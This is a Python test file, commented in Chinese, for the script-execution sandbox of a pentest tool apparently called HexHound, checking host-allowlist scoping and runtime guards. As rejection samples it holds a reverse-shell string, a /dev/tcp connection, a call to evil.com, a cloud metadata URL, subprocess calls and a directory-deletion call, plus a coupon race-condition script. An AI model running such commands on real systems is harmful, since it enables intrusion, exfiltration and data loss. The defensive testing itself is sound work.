"""自定义脚本通道（sandbox_script）测试。

这是 HexHound 里**表达力最强**的一条通道（竞态、业务逻辑、密文分析都靠它），
所以约束也要最硬：脚本正文要过作用域校验，运行时还要有护栏，且脚本通道不能成为
真工具禁令的后门（起子进程 / 破坏性操作 / 反弹 shell 一律拒）。

测试不依赖 Docker/WSL：执行环节用替身捕获命令，只验证"生成什么命令、拒绝什么脚本"。
"""
from __future__ import annotations

import base64
import json
import sys
import unittest
from pathlib import Path
from unittest.mock import patch

SRC = Path(__file__).resolve().parents[1] / "src"
sys.path.insert(0, str(SRC))

from hexhound.sandbox import ExecResult, Sandbox, ScopeViolation  # noqa: E402
from hexhound.tools import (  # noqa: E402
    _DESC_SANDBOX_SCRIPT,
    ROLE_TOOLS,
    SANDBOX_TOOLS,
)


def make_sandbox(**kwargs) -> Sandbox:
    params = {
        "allowed_hosts": frozenset({"target.com", "127.0.0.1", "localhost"}),
        "map_loopback": False,
    }
    params.update(kwargs)
    return Sandbox(**params)


RACE_SCRIPT = """
import threading, urllib.request
URL = "http://127.0.0.1:5000/coupon"
results = []
barrier = threading.Barrier(6)

def fire():
    barrier.wait()
    req = urllib.request.Request(URL, data=b"code=HH-ONCE-200", method="POST")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            results.append(json.loads(resp.read()))
    except Exception as exc:
        results.append({"error": str(exc)})

threads = [threading.Thread(target=fire) for _ in range(6)]
[t.start() for t in threads]
[t.join() for t in threads]
print("success", sum(1 for r in results if r.get("code") == 0))
""".replace("json.loads", "__import__('json').loads")


class ScriptScopeTests(unittest.TestCase):
    """脚本正文的作用域与安全校验。"""

    def setUp(self) -> None:
        self.sandbox = make_sandbox()

    def test_accepts_allowlisted_script(self) -> None:
        self.sandbox.check_script(RACE_SCRIPT)

    def test_rejects_foreign_url_in_script(self) -> None:
        with self.assertRaises(ScopeViolation) as ctx:
            self.sandbox.check_script('import urllib.request\nurllib.request.urlopen("http://evil.com/x")')
        self.assertIn("evil.com", str(ctx.exception))

    def test_rejects_foreign_bare_ip(self) -> None:
        with self.assertRaises(ScopeViolation):
            self.sandbox.check_script('HOSTS = ["8.8.8.8"]\nprint(HOSTS)')

    def test_rejects_quoted_foreign_domain(self) -> None:
        """脚本里最常见的写法是引号包一个域名——只扫 URL 会漏。"""
        with self.assertRaises(ScopeViolation) as ctx:
            self.sandbox.check_script('import socket\nsocket.create_connection(("evil.com", 80))')
        self.assertIn("evil.com", str(ctx.exception))

    def test_rejects_metadata_endpoint(self) -> None:
        with self.assertRaises(ScopeViolation):
            self.sandbox.check_script('import urllib.request\nurllib.request.urlopen("http://169.254.169.254/latest/meta-data/")')

    def test_rejects_empty_and_oversized(self) -> None:
        with self.assertRaises(ValueError):
            self.sandbox.check_script("   ")
        with self.assertRaises(ValueError):
            self.sandbox.check_script("print(1)\n" * 4000)

    def test_rejects_shell_escape_patterns(self) -> None:
        """脚本通道不是真工具禁令的后门：起子进程一律拒。"""
        for snippet in (
            'import os\nos.system("id")',
            'import subprocess\nsubprocess.run(["id"])',
            'import os\nos.popen("id")',
        ):
            with self.assertRaises(ValueError, msg=snippet):
                self.sandbox.check_script(snippet)

    def test_rejects_destructive_and_reverse_shell(self) -> None:
        for snippet in (
            'import shutil\nshutil.rmtree("/tmp/x")',
            'print(open("/dev/tcp/1.2.3.4/4444"))',
            'cmd = "bash -i >& /dev/tcp/x/1"',
        ):
            with self.assertRaises(ValueError, msg=snippet):
                self.sandbox.check_script(snippet)

    def test_requires_allowlist_configuration(self) -> None:
        bare = Sandbox(allowed_hosts=frozenset())
        with self.assertRaises(ScopeViolation):
            bare.check_script("print(1)")


class ScriptExecutionTests(unittest.TestCase):
    """执行环节：生成带护栏的启动命令，且校验失败时**根本不执行**。"""

    def setUp(self) -> None:
        self.sandbox = make_sandbox()

    @staticmethod
    def _payload_of(command: str) -> str:
        """从 `python3 -c "<启动器>"` 里取出 base64 载荷并解码。"""
        launcher = json.loads(command.split("python3 -c ", 1)[1])
        marker = "b64decode("
        start = launcher.index(marker) + len(marker)
        end = launcher.index(")", start)
        return base64.b64decode(launcher[start:end].strip("'\"")).decode("utf-8")

    def _capture(self, script: str, **kwargs) -> tuple[ExecResult, str]:
        captured: dict[str, str] = {}

        def fake_execute(command, **inner):
            captured["command"] = command
            captured["script"] = inner.get("script", "")
            captured["check_scope"] = inner.get("check_scope")
            captured["check_tool"] = inner.get("check_tool")
            return ExecResult(ok=True, command=command, stdout="ok", script=inner.get("script", ""))

        with patch.object(self.sandbox, "_execute", side_effect=fake_execute):
            result = self.sandbox.run_script(script, **kwargs)
        return result, captured.get("command", "")

    def test_launcher_is_single_line(self) -> None:
        """回归：启动器里出现换行会让整条脚本通道静默失效。

        实测踩过——多行护栏经 json.dumps + bash 两层解析后变成字面量 `\\n`，
        而 `python3 -c` 不解释该转义，每次都 SyntaxError，**所有**脚本调用全废。
        """
        _, command = self._capture(RACE_SCRIPT)
        launcher = json.loads(command.split("python3 -c ", 1)[1])
        self.assertNotIn("\n", launcher)
        self.assertNotIn("\\n", launcher)
        self.assertIn("exec(compile(", launcher)

    def test_launcher_embeds_runtime_guard(self) -> None:
        """护栏必须在进程内接管 DNS 与 socket——静态扫描挡不住字符串拼接。"""
        _, command = self._capture(RACE_SCRIPT)
        payload = self._payload_of(command)
        self.assertIn("getaddrinfo", payload)
        self.assertIn("socket.connect", payload)
        self.assertIn("hexhound-scope", payload)

    def test_payload_roundtrips_to_original_script(self) -> None:
        _, command = self._capture(RACE_SCRIPT)
        payload = self._payload_of(command)
        self.assertIn("Barrier(6)", payload)
        self.assertIn("127.0.0.1:5000/coupon", payload)

    def test_loopback_mapped_inside_script_and_allowlist(self) -> None:
        """脚本里的回环地址要映射成宿主可达地址，且映射后的地址必须在护栏白名单里。

        顺序很关键：先按用户声明的目标做校验，再映射——和命令行通道一致。
        """
        sandbox = make_sandbox(map_loopback=True)
        with patch.object(sandbox, "host_gateway", return_value="192.168.160.1"):
            captured: dict[str, str] = {}

            def fake_execute(command, **inner):
                captured["command"] = command
                return ExecResult(ok=True, command=command, script=inner.get("script", ""))

            with patch.object(sandbox, "_execute", side_effect=fake_execute):
                sandbox.run_script(RACE_SCRIPT)
        payload = self._payload_of(captured["command"])
        self.assertIn("192.168.160.1:5000/coupon", payload)
        self.assertNotIn("127.0.0.1:5000", payload)
        self.assertIn("192.168.160.1", payload)

    def test_violating_script_never_executes(self) -> None:
        called = {"n": 0}

        def fake_execute(command, **inner):  # pragma: no cover - 不应被调用
            called["n"] += 1
            return ExecResult(ok=True, command=command)

        with patch.object(self.sandbox, "_execute", side_effect=fake_execute):
            result = self.sandbox.run_script('urllib.request.urlopen("http://evil.com")')
        self.assertFalse(result.ok)
        self.assertEqual(called["n"], 0)
        self.assertIn("evil.com", result.error)

    def test_rejects_non_python_interpreter(self) -> None:
        result = self.sandbox.run_script("print(1)", interpreter="bash")
        self.assertFalse(result.ok)
        self.assertIn("python3", result.error)

    def test_script_text_kept_for_evidence(self) -> None:
        result, _ = self._capture(RACE_SCRIPT)
        self.assertIn("Barrier(6)", result.script)


class ScriptToolWiringTests(unittest.TestCase):
    """工具门控：谁能用、沙箱不可用时是否摘掉。"""

    def test_roles_allowed(self) -> None:
        for role in ("injection", "auth", "verify"):
            self.assertIn("sandbox_script", ROLE_TOOLS[role], role)

    def test_recon_and_source_do_not_get_it(self) -> None:
        # 侦察只负责摸面，不给执行脚本的手；源码模式也不给（避免变成任意执行）
        self.assertNotIn("sandbox_script", ROLE_TOOLS.get("recon", ()))
        self.assertNotIn("sandbox_script", ROLE_TOOLS.get("source", ()))

    def test_requires_python3_in_sandbox(self) -> None:
        self.assertEqual(SANDBOX_TOOLS["sandbox_script"], "python3")

    def test_description_mentions_the_three_classes(self) -> None:
        for keyword in ("竞态", "业务逻辑", "加密", "白名单"):
            self.assertIn(keyword, _DESC_SANDBOX_SCRIPT)


if __name__ == "__main__":
    unittest.main()
